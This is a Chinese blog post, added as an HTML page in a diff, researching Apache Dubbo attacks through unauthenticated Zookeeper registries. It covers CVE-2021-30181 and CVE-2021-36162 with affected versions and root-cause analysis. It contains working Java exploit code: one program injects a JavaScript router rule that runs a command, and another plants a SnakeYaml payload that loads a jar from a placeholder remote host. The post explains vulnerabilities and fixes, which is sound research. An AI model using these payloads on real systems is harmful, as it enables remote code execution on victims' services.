@@ -1,0 +1,741 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="FanneF">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一、背景云环境下，Dubbo作为常用的开源高性能优秀的服务框架，在广泛使用的同时，更应关注其安全性。其架构中包含Provider、Consumer、Registry、Monitor。可从这几点展开讨论其安全性。 二、风险分析注册中心分为：Multicast注册中心、Zookeeper注册中心、Redis注册中心、Simple注册中心。 zookeeper最为常用，以zookeeper为例，分析微服">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DUBBO安全研究--Zookeeper篇">
+<meta property="og:url" content="http://example.com/2023/03/27/DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/index.html">
+<meta property="og:site_name" content="FanneF">
+<meta property="og:description" content="一、背景云环境下，Dubbo作为常用的开源高性能优秀的服务框架，在广泛使用的同时，更应关注其安全性。其架构中包含Provider、Consumer、Registry、Monitor。可从这几点展开讨论其安全性。 二、风险分析注册中心分为：Multicast注册中心、Zookeeper注册中心、Redis注册中心、Simple注册中心。 zookeeper最为常用，以zookeeper为例，分析微服">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCEd33e679f424f81308830ccea33d1bb49.png">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCEa3009e7295e8c710a83e731454ab4e79.png">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCEb9f32a1183cafa927ba8735f36484ce0.png">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCE2adcc33b23bd156c928d75e7a77f2871.png">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCE0a6fe9b46f010de10eea5f5915884fce.png">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCE0d36bc7add2bf447ea1fce339e26ba79.png">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCE3b86110e6a0ad726b94748026d2b188a.png">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCE95a58d41297829043fd0e5050e7871f1.png">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCE20f4015c836eaf6fc1c8a9fa06430c7e.png">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCEe2c124b9b06fc41903fd95d5ba9eeb91.png">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCE0721ef3b2ecd3b859654713c420a47ac.png">
+<meta property="og:image" content="http://example.com/images/WEBRESOURCE7b71e25842446c51670ebd702fda5995.png">
+<meta property="article:published_time" content="2023-03-27T14:24:47.000Z">
+<meta property="article:modified_time" content="2023-03-27T15:29:13.743Z">
+<meta property="article:author" content="FanneF">
+<meta property="article:tag" content="云安全">
+<meta property="article:tag" content="Dubbo">
+<meta property="article:tag" content="应用安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/images/WEBRESOURCEd33e679f424f81308830ccea33d1bb49.png">
+  
+  
+  
+  <title>DUBBO安全研究--Zookeeper篇 - FanneF</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>FanneF</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DUBBO安全研究--Zookeeper篇"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-27 22:24" pubdate>
+          2023年3月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          60 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DUBBO安全研究--Zookeeper篇</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h2><p>云环境下，Dubbo作为常用的开源高性能优秀的服务框架，在广泛使用的同时，更应关注其安全性。其架构中包含Provider、Consumer、Registry、Monitor。可从这几点展开讨论其安全性。</p>
+<h2 id="二、风险分析"><a href="#二、风险分析" class="headerlink" title="二、风险分析"></a>二、风险分析</h2><p>注册中心分为：Multicast注册中心、Zookeeper注册中心、Redis注册中心、Simple注册中心。</p>
+<p>zookeeper最为常用，以zookeeper为例，分析微服务架构中注册中心面临的威胁。</p>
+<p>1、漏洞：关于注册中心注入payload的高危命令执行漏洞有： CVE-2021-30181、CVE-2021-36162。</p>
+<p>2、错误路由：通过查看zk中的provider接口，模仿其接口编码规范对consumer的调用进行干扰，影响业务。    </p>
+<p> CVE-2021-30181影响范围                  </p>
+<ul>
+<li><p>使用Dubbo 2.5.x版本的所有用户。</p>
+</li>
+<li><p>使用Dubbo 2.6.10之前版本的所有用户。</p>
+</li>
+<li><p>使用Dubbo 2.7.10之前版本的所有用户。</p>
+</li>
+</ul>
+<h2 id="CVE-2021-36162影响范围"><a href="#CVE-2021-36162影响范围" class="headerlink" title="CVE-2021-36162影响范围"></a>CVE-2021-36162影响范围</h2><ul>
+<li><p>使用Dubbo 2.7.0到2.7.12的所有用户。</p>
+</li>
+<li><p>使用Dubbo 3.0.0 to 3.0.1的所有用户。</p>
+</li>
+<li><p>使用Dubbo-admin的所有用户。</p>
+</li>
+</ul>
+<p>两个漏洞均是因为zookeeper未授权访问导致的script脚本&#x2F;yaml解析命令执行。</p>
+<h2 id="三、威胁利用"><a href="#三、威胁利用" class="headerlink" title="三、威胁利用"></a>三、威胁利用</h2><h3 id="1、CVE-2021-30181"><a href="#1、CVE-2021-30181" class="headerlink" title="1、CVE-2021-30181"></a>1、CVE-2021-30181</h3><p>实验环境dubbo 2.7.6</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/05/30/Dubbo%20Consumer%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5RCE%20-%20CVE-2021-30181/">https://threedr3am.github.io/2021/05/30/Dubbo%20Consumer%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5RCE%20-%20CVE-2021-30181/</a></p>
+<p>此漏洞通过向注册中心注入script脚本进行攻击利用，攻击目标为consumer。</p>
+<p>在consumer调用provider时，会先到注册中心（zk）中查看路由（routers），根据路由的策略，调用相关的provider。dubbo存在心跳检测机制，如果向zk注入恶意命令执行router策略，会立马执行，因为consumer会定时RPC发送心跳包到provider。</p>
+<p>Zookeeper中每个服务节点的目录为：</p>
+<p>configurators</p>
+<p>providers</p>
+<p>routers</p>
+<p>这些node下的内容变动时，consumer的Zookeeper监听器会watch到，然后通知到org.apache.dubbo.registry.integration.RegistryDirectory#notify方法，更新相关数据。</p>
+<p><img src="/./images/WEBRESOURCEd33e679f424f81308830ccea33d1bb49.png" srcset="/img/loading.gif" lazyload></p>
+<p>漏洞触发点：</p>
+<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> &lt;T&gt; List&lt;Invoker&lt;T&gt;&gt; route(List&lt;Invoker&lt;T&gt;&gt; invokers, URL url, Invocation invocation) throws RpcException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        Bindings bindings = <span class="hljs-keyword">this</span>.createBindings(invokers, invocation);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.function == <span class="hljs-literal">null</span> ? invokers : <span class="hljs-keyword">this</span>.getRoutedInvokers(<span class="hljs-keyword">this</span>.function.eval(bindings));<br>    &#125; <span class="hljs-keyword">catch</span> (ScriptException var5) &#123;<br>        logger.error(<span class="hljs-string">&quot;route error, rule has been ignored. rule: &quot;</span> + <span class="hljs-keyword">this</span>.rule + <span class="hljs-string">&quot;, method:&quot;</span> + invocation.getMethodName() + <span class="hljs-string">&quot;, url: &quot;</span> + RpcContext.getContext().getUrl(), var5);<br>        <span class="hljs-keyword">return</span> invokers;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>向zk中注入恶意script脚本</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> dubbo;<br><br><span class="hljs-keyword">import</span> org.apache.dubbo.common.extension.ExtensionLoader;<br><span class="hljs-keyword">import</span> org.apache.dubbo.registry.Registry;<br><span class="hljs-keyword">import</span> org.apache.dubbo.registry.RegistryFactory;<br><br><span class="hljs-comment">//dubbo2.0 注册恶意script</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RegisterRouters</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// 获取注册中心的扩展类</span><br>        <span class="hljs-type">RegistryFactory</span> <span class="hljs-variable">registryFactory</span> <span class="hljs-operator">=</span> ExtensionLoader.getExtensionLoader(RegistryFactory.class).getAdaptiveExtension();<br><br>        <span class="hljs-comment">// 获取注册中心，这里使用zk</span><br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> registryFactory.getRegistry(org.apache.dubbo.common.URL.valueOf(<span class="hljs-string">&quot;zookeeper://127.0.0.1:2181&quot;</span>));<br><br>        <span class="hljs-comment">// 注册中心上配置规则</span><br>        registry.register(org.apache.dubbo.common.URL.valueOf(<span class="hljs-string">&quot;script://192.168.1.9/common.ProviderService?&quot;</span> +<br>                <span class="hljs-string">&quot;application=consumer&amp;category=routers&amp;check=false&amp;dubbo=2.0.2&amp;&quot;</span> +<br>                <span class="hljs-string">&quot;init=false&amp;interface=common.ProviderService&amp;methods=sayHello&quot;</span> +<br>                <span class="hljs-string">&quot;&amp;pid=4780&amp;release=2.7.6&amp;side=consumer&amp;sticky=false&amp;&quot;</span> +<br>                <span class="hljs-string">&quot;timestamp=1678326819280&amp;route=script&amp;type=javascript&amp;&quot;</span> +<br>                <span class="hljs-string">&quot;rule=s%3D%5B1%5D%3Bs%5B0%5D%3D&#x27;calc.exe&#x27;%3Bjava.lang.Runtime.getRuntime().exec(s)%3B&quot;</span>));<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>注入成功</p>
+<p><img src="/./images/WEBRESOURCEa3009e7295e8c710a83e731454ab4e79.png" srcset="/img/loading.gif" lazyload></p>
+<p>启动consumer来解析script脚本</p>
+<p><img src="/./images/WEBRESOURCEb9f32a1183cafa927ba8735f36484ce0.png" srcset="/img/loading.gif" lazyload></p>
+<p>漏洞解析：</p>
+<p>入口点：</p>
+<p>org.apache.dubbo.rpc.cluster.router.script.ScriptRouter</p>
+<p><img src="/./images/WEBRESOURCE2adcc33b23bd156c928d75e7a77f2871.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/./images/WEBRESOURCE0a6fe9b46f010de10eea5f5915884fce.png" srcset="/img/loading.gif" lazyload></p>
+<p>执行点：</p>
+<p>org.apache.dubbo.rpc.cluster.router.script.route</p>
+<p><img src="/./images/WEBRESOURCE0d36bc7add2bf447ea1fce339e26ba79.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/./images/WEBRESOURCE3b86110e6a0ad726b94748026d2b188a.png" srcset="/img/loading.gif" lazyload></p>
+<p>调用栈：</p>
+<p><img src="/./images/WEBRESOURCE95a58d41297829043fd0e5050e7871f1.png" srcset="/img/loading.gif" lazyload></p>
+<p>修复方案：</p>
+<p>官方升级dubbo 2.7.10是通过禁用默认的ScriptRout解析来防止ScriptRoutor的注入，并再项目中加入开关，用户可自定义打开&#x2F;关闭开关。</p>
+<p><img src="/./images/WEBRESOURCE20f4015c836eaf6fc1c8a9fa06430c7e.png" srcset="/img/loading.gif" lazyload></p>
+<p>添加此配置可开启ScriptRouter</p>
+<p><img src="/./images/WEBRESOURCEe2c124b9b06fc41903fd95d5ba9eeb91.png" srcset="/img/loading.gif" lazyload></p>
+<p>添加成功后依旧可以利用成功</p>
+<p><img src="/./images/WEBRESOURCE0721ef3b2ecd3b859654713c420a47ac.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="2、CVE-2021-36162"><a href="#2、CVE-2021-36162" class="headerlink" title="2、CVE-2021-36162"></a>2、CVE-2021-36162</h3><p>实验环境dubbo 3.0.0</p>
+<p>这里借鉴文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Lt15gLdE_DYR3Ng2NVrWrg">https://mp.weixin.qq.com/s/Lt15gLdE_DYR3Ng2NVrWrg</a></p>
+<p>此漏洞通过向注册中心注入.migration配置文件进行攻击利用，攻击目标为consumer。</p>
+<p>在consumer调用provider时，会先到注册中心（zk）中dubbo&#x2F;config&#x2F;路径下解析对应consumer的migration配置文件，调用不同版本的provider。注：此处版本为dubbo版本。</p>
+<p>migration配置文件为dubbo 3.x特有功能，dubbo 2.x不具备此功能，为了实现dubbo2向dubbo3平滑迁移引入的功能，查看官方文档（<a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/upgrades-and-compatibility/service-discovery/migration-service-discovery/%EF%BC%89%EF%BC%8C%E5%8F%AF%E7%9F%A5%E6%AD%A4%E5%8A%9F%E8%83%BD%E6%98%AF%E9%BB%98%E8%AE%A4%E5%90%AF%E7%94%A8%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E9%99%8D%E4%BD%8E%E4%BA%86%E5%88%A9%E7%94%A8%E9%9A%BE%E5%BA%A6%EF%BC%8C%E5%8F%AA%E9%9C%80%E8%A6%81%E6%88%91%E4%BB%AC%E7%9B%B4%E6%8E%A5%E5%BE%80zk%E7%9A%84%E5%AF%B9%E5%BA%94%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%B3%A8%E5%86%8C%E6%88%91%E4%BB%AC%E7%9A%84%E6%81%B6%E6%84%8Fpayload%E5%8D%B3%E5%8F%AF%E3%80%82">https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/upgrades-and-compatibility/service-discovery/migration-service-discovery/），可知此功能是默认启用的，所以降低了利用难度，只需要我们直接往zk的对应目录下注册我们的恶意payload即可。</a></p>
+<p><img src="/./images/WEBRESOURCE7b71e25842446c51670ebd702fda5995.png" srcset="/img/loading.gif" lazyload></p>
+<p>漏洞触发点:</p>
+<p>org.apache.dubbo.rpc.cluster.support.migration</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MigrationRule</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DUBBO_SERVICEDISCOVERY_MIGRATION_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dubbo.application.service-discovery.migration&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DUBBO_SERVICEDISCOVERY_MIGRATION_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;MIGRATION&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">RULE_KEY</span> <span class="hljs-operator">=</span> ApplicationModel.getName() + <span class="hljs-string">&quot;.migration&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">DynamicConfiguration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> String key;    <br>    <span class="hljs-keyword">private</span> MigrationStep step;<br>        ...    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> MigrationRule <span class="hljs-title function_">parse</span><span class="hljs-params">(String rawRule)</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == configuration) &#123;<br>                        <span class="hljs-keyword">return</span> getMigrationRule((String)<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!StringUtils.isBlank(rawRule) &amp;&amp; !<span class="hljs-string">&quot;INIT&quot;</span>.equals(rawRule)) &#123;<br>                        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Constructor</span>(MigrationRule.class);            <br>                        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>(constructor); <br>                        <span class="hljs-keyword">return</span> (MigrationRule)yaml.load(rawRule);        <br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">step</span> <span class="hljs-operator">=</span> (String)configuration.getInternalProperty(<span class="hljs-string">&quot;dubbo.application.service-discovery.migration&quot;</span>);<br>                        <span class="hljs-keyword">return</span> getMigrationRule(step);<br>            &#125;    <br>     &#125;    <br>         ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是目前dubbo 3.0.0版本查看源码的时候漏洞触发点官方已经修复了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> MigrationRule <span class="hljs-title function_">parse</span><span class="hljs-params">(String rawRule)</span> &#123;<br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeConstructor</span>());<span class="hljs-comment">//这里用了安全的方法，无法使其解析我们的恶意yaml</span><br>    Map&lt;String, Object&gt; map = (Map)yaml.load(rawRule);<br>    <span class="hljs-keyword">return</span> parseFromMap(map);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>此配置要求consumer升级到dubbo 3才可以（dubbo 2 consumer里面根本没办法配置迁移配置文件），所以本环境便无法利用，但是整个思路还是值得借鉴的。</p>
+<p>首先向zk里注册恶意配置文件：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">papackage com.example.dubbo.payload;<br><br><span class="hljs-keyword">import</span> org.apache.curator.RetryPolicy;<br><span class="hljs-keyword">import</span> org.apache.curator.framework.CuratorFramework;<br><span class="hljs-keyword">import</span> org.apache.curator.framework.CuratorFrameworkFactory;<br><span class="hljs-keyword">import</span> org.apache.curator.retry.ExponentialBackoffRetry;<br><span class="hljs-keyword">import</span> org.apache.zookeeper.data.Stat;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RegisterYaml</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/dubbo/config/DUBBO_SERVICEDISCOVERY_MIGRATION/consumer.migration&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://IP:PORT/yaml-payload.jar\&quot;]]]]\n&quot;</span>;<br><br>        <span class="hljs-type">RetryPolicy</span> <span class="hljs-variable">retryPolicy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExponentialBackoffRetry</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">3</span>);<br>        <span class="hljs-type">CuratorFramework</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> CuratorFrameworkFactory.newClient(<span class="hljs-string">&quot;192.168.10.5:2181&quot;</span>, retryPolicy);<br>        client.start();<br><br>        <span class="hljs-type">Stat</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> client.checkExists().forPath(path);<br><br>        <span class="hljs-keyword">if</span> (stat != <span class="hljs-literal">null</span>) &#123;<br>            client.delete().forPath(path);<br>        &#125;<br><br>        client.create().forPath(path, poc.getBytes());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>为什么向“&#x2F;dubbo&#x2F;config&#x2F;DUBBO_SERVICEDISCOVERY_MIGRATION&#x2F;consumer.migration”这个路径注册呢</p>
+<p>在官方文档中（<a target="_blank" rel="noopener" href="https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/upgrades-and-compatibility/service-discovery/service-discovery-samples/%EF%BC%89%EF%BC%8C%E8%A7%84%E5%AE%9A%E8%B7%AF%E5%BE%84%E7%9A%84%E6%A0%BC%E5%BC%8F%E4%B8%BA%EF%BC%9A%E2%80%9CKey">https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/upgrades-and-compatibility/service-discovery/service-discovery-samples/），规定路径的格式为：“Key</a> 为应用名 + .migration （如 demo-application.migraion），Group 为DUBBO_SERVICEDISCOVERY_MIGRATION”。</p>
+<p>从上面的漏洞触发点可以看出此漏洞利用的是通用漏洞SnakeYaml解析漏洞进行攻击，所以尝试注入的poc为一段yaml文本。</p>
